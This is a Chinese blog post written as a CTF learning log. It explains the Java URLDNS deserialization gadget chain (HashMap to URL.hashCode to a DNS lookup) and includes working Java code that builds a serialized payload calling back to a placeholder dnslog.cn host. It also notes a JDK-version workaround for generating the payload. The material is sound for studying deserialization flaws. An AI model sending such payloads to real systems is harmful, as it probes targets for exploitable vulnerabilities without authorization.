---
date: 2024-05-12
categories:
    - CTF
tags: 
    - Java
    - 反序列化
slug: learning-java-urldns
readtime: 9

--- 

# Java学习日志——URLDNS小结


开始学习 Java 反序列化，开此文章记录向其迈出的第一步。

> 前置知识：Java 反射的基本利用。Java 序列化与反序列化的基本原理

<!-- more -->

## 跟进查看入口类 HashMap

根据 `ysoserial`上的 URLDNS 模块源码，我们得知整条链如下

```
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
```

在略微学习了一下基本的反序列化只是之后，我们知道对象反序列化，会触发该对象的 `readObject()` 方法。而想要利用反序列化漏洞，我们要尽可能找到一个合适的入口类，通常需要如下的要求：

1. 该类为 Java 内部类，或是很常见的外部类，从而确保适用性。
1. 该类自己实现了 `readObject()` 方法。
2. 该类的 `readObject()` 方法会触发其他方法，并且最终来到我们要执行的类的方法。

大佬们找到了 `HashMap`类，这个类重写了 `readObject()` 方法，在其中，我们能看到他对每个元素的 key 值调用的 `hash()` 方法，以确保 key 值在不同的机器上的 hash 值唯一。

这是 `HashMap.readObject()` 方法的部分实现，可以看到每个 key 都会调用 `hash()` 方法。

![image-20240512144317476](https://repo.sxrhhh.top/undefinedimage-20240512144317476.png)

跟进 `hash()` 方法，可以看见它对 key 值调用了 `hashCode()` 方法（只要 key 存在）。

![image-20240512144510070](https://repo.sxrhhh.top/undefinedimage-20240512144510070.png)

到此停止跟进，因为现在要调用的是 key 的 `hashCode()` 方法，我们需要找到一个类作为执行类，放入 HashMap 的 key 字段，这样当他反序列化时就会执行这个 key 对象的 `hashCode()` 方法。

## 跟进查看执行类 URL

现在我们需要第二个类放入 HashMap 的 key 字段，并且满足以下要求：

1. 可以被反序列化，即实现 serializeable 接口
1. 同样要求要么内部类，要么属于攻击目标的依赖，这样目标反序列化后才可以执行成功。
2. 不要求拥有 `readObject()` 方法，但是要求有上一个类传递下来的同名方法
3. 最好能够执行我们需要的命令，或者能够将链条延伸到下一个执行类

大佬们又找到了第二个类：`URL` 类。

这个类有着 `hashCode()` 方法，可以连接上面。然后这个方法最终可以发送一个 dns 请求，完成反序列化执行。我们跟进 URL 类，看下他的 `hashCode()` 方法：

![image-20240512145854555](https://repo.sxrhhh.top/undefinedimage-20240512145854555.png)

可以看到 URL 类存在一个私有属性 `hashCode` 且默认值为 -1：

![image-20240512150217606](https://repo.sxrhhh.top/undefinedimage-20240512150217606.png)

也就是说，当 URL 对象并没有执行过 `hashCode()`方法时，他会调用他的 `handler.hashCode()` 方法。这个叫做 `URLStreamHandler` 的类也算是这条攻击链的一环。我们跟进一下：

![image-20240512151133867](https://repo.sxrhhh.top/undefinedimage-20240512151133867.png)

可以看见 `handler.hashCode()` 方法会调用 url 的 `getHostAddress()`方法，这个方法会向着域名类型的 URL 链接发送 dns 请求，从而确认存在反序列化漏洞。

## 构造攻击链

我们写一个 Main 程序用来序列化我们的 payload。

```java
        // 1. 创建 url 对象和 HashMap 对象
        URL url = new URL("http://xxxxx.dnslog.cn");
        HashMap<URL, Integer> map = new HashMap<>();

        // 2. 将 url 的 hashCode 属性改为非 -1 值
        Field urlHashcode = URL.class.getDeclaredField("hashCode") ;
        urlHashcode.setAccessible(true) ;
        urlHashcode.set(url, 1234);

        // 3. 将 url 存入 hashMap
        map.put(url, 1);

        // 4. 将 url 的 hashCode 改为 -1
        urlHashcode.set(url, -1);

        // 5. 序列化 hashMap,存入文件中
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("test.ser")));
        oos.writeObject(map);
```

可以看到，我们这里比预想的多出了 2和4 两个步骤。这是为什么呢。因为为了保证只有在反序列化成功时才会发送 dns 请求，那么之前我们就不允许发送 dns 请求。但是如果去掉第 2 步，我们会发现还没有反序列化就已经发送了 dns 请求。这是因为 `HashMap.put()` 方法也会走一遍攻击链。我们跟进 `put()` 方法：

![image-20240512161223224](https://repo.sxrhhh.top/undefinedimage-20240512161223224.png)

可以看到，和之前的攻击链如出一辙，并且还会修改我们的 `hashCode`，让我们的这个值不再等于 -1, 也就是说我们反序列化之后就不会再发送 dns 请求了。因此我们通过反射，提前将 `hashCode` 的值变为非 -1, 使得 `put`方法不会干扰我们的判断，然后再改回 -1, 进行序列化。

## 反序列化测试

我们写好一个反序列化类用来测试我们的 payload :

```java
        ObjectInputStream oos = new ObjectInputStream(new FileInputStream(new File("test.ser")));
        Object obj = (Object) oos.readObject();
```

简简单单两行代码，所做的就是反序列化一个对象。我们测试一下。先在 dnslog 上面申请一个地址，然后序列化。可以看见 dnslog 并没有反应。然后我们得到了叫做 "test.ser" 的 payload。我们再运行反序列化的方法，可以看到，dnslog有了一次 dns 记录。

![image-20240512174759236](https://repo.sxrhhh.top/undefinedimage-20240512174759236.png)

## JDK 版本问题

如果我使用的是 JDK17 作为序列化类的运行环境的话，会爆出以下的错误：

```
Exception in thread "main" java.lang.reflect.InaccessibleObjectException: Unable to make field private int java.net.URL.hashCode accessible: module java.base does not "opens java.net" to unnamed module @4617c264
	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)
	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)
	at java.base/java.lang.reflect.Field.checkCanSetAccessible(Field.java:178)
	at java.base/java.lang.reflect.Field.setAccessible(Field.java:172)
	at top.sxrhhh.testSerialize.Main.main(Main.java:25)
```

经过查阅，这是在 JDK17 新加入的特性，就是强制要求反射不允许对 Java 内部 api 进行操作。那么我们还怎么构造 payload 呢？难道说只能使用 1.8 ？经过各种版本的实验，我发现其实反序列化作为网络上传输数据的一种方法，并不一定要求 Java 的版本一致。因此，我们大可以不必费尽心思去绕过这一层，而是直接使用 1.8 低版本 JDK 去生成 payload, 然后再用 JDK17 的高版本运行反序列化类，就会发现效果是一样的。

## 小小总结

URLDNS 利用范围很广，它不依赖 JDK 的版本，使用的全是 Java 的内部类。因此，我们可以构造出 URLDNS 的 payload 用于检验目标是否具有反序列化漏洞。

---

作者：Sxrhhh

个人网站：[https://www.sxrhhh.top](https://www.sxrhhh.top/)

博客园：[Sxrhhh - 博客园 (cnblogs.com)](https://www.cnblogs.com/sxrhhh/)

转载请注明出处.

在个人网站持续更新中……